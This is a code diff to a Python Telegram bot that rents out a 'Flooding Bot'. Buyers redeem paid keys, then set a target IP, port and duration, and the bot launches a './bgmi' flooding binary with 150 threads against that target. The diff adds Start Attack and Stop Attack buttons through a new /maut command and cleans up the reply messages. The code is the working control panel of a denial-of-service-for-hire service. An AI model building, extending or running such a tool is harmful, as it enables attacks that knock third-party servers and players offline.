@@ -1,13 +1,11 @@
-
-
 import subprocess
 import json
 import os
 import random
 import string
 import datetime
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 
 
@@ -17,13 +15,10 @@ KEY_FILE = "../keys.json"
 flooding_process = None
 flooding_command = None
 
-
 DEFAULT_THREADS = 150
-
 
 users = {}
 keys = {}
-
 
 def load_data():
     global users, keys
@@ -93,7 +88,6 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     await update.message.reply_text(response)
 
-
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     command = context.args
@@ -118,7 +112,6 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     await update.message.reply_text(response)
 
-
 async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     if user_id in ADMIN_IDS:
@@ -137,6 +130,46 @@ async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         response = "ONLY OWNER CAN USE."
     await update.message.reply_text(response)
 
+async def maut(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @LDX_COBRA")
+        return
+
+    keyboard = [
+        [
+            InlineKeyboardButton("Start Attack", callback_data="start_attack"),
+            InlineKeyboardButton("Stop Attack", callback_data="stop_attack")
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("Choose an action:", reply_markup=reply_markup)
+
+async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    user_id = str(query.from_user.id)
+
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await query.answer("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @LDX_COBRA")
+        return
+
+    if query.data == "start_attack":
+        if flooding_process is not None:
+            await query.answer('❌ Attack already running.')
+        elif flooding_command is None:
+            await query.answer('No flooding parameters set. Use /bgmi to set parameters.')
+        else:
+            flooding_process = subprocess.Popen(flooding_command)
+            await query.answer('🚀 Attack Started...')
+    elif query.data == "stop_attack":
+        if flooding_process is None:
+            await query.answer('No flooding process is running.')
+        else:
+            flooding_process.terminate()
+            flooding_process = None
+            await query.answer('✅ Attack Stopped...')
+        return
 
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global flooding_command
@@ -157,7 +190,6 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
     await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWMER- @LDX_COBRA.')
 
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global flooding_process, flooding_command
     user_id = str(update.message.from_user.id)
@@ -167,7 +199,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if flooding_process is not None:
-        await update.message.reply_text('❌𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐑𝐔𝐍𝐍𝐈𝐍𝐆❌.')
+        await update.message.reply_text('❌ Attack already running.')
         return
 
     if flooding_command is None:
@@ -175,25 +207,23 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text('🚀𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫...🚀')
-
+    await update.message.reply_text('🚀 Attack Started...')
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global flooding_process
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.buy key from- @LDX_COBRA")
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @LDX_COBRA")
         return
 
     if flooding_process is None:
-        await update.message.reply_text('No flooding process is running.OWNER @LDX_COBRA...')
+        await update.message.reply_text('No flooding process is running.')
         return
 
     flooding_process.terminate()
     flooding_process = None
-    await update.message.reply_text('𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑶𝑷𝑬𝑫...✅')
-
+    await update.message.reply_text('Attack Stopped...✅')
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
@@ -214,7 +244,6 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     
     await update.message.reply_text(response)
 
-
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     response = (
         "Welcome to the Flooding Bot by @{OWNER_USERNAME}..! Here are the available commands:\n\n"
@@ -225,8 +254,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "User Commands:\n"
         "/redeem <key> - Redeem a key to gain access.\n"
         "/bgmi <target_ip> <port> <duration> - Set the flooding parameters.\n"
-        "/start - Start the flooding process.\n"
-        "/stop - Stop the flooding process.\n"
+        "/maut - Start or Stop the attack using buttons.\n"
     )
     await update.message.reply_text(response)
 
@@ -237,14 +265,15 @@ def main() -> None:
     application.add_handler(CommandHandler("redeem", redeem))
     application.add_handler(CommandHandler("allusers", allusers))
     application.add_handler(CommandHandler("bgmi", bgmi))
+    application.add_handler(CommandHandler("maut", maut))
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("stop", stop))
     application.add_handler(CommandHandler("broadcast", broadcast))
     application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(CallbackQueryHandler(button))  # Add this handler to listen for button presses
 
     load_data()
     application.run_polling()
 
 if __name__ == '__main__':
     main()
-#BGS_MODS
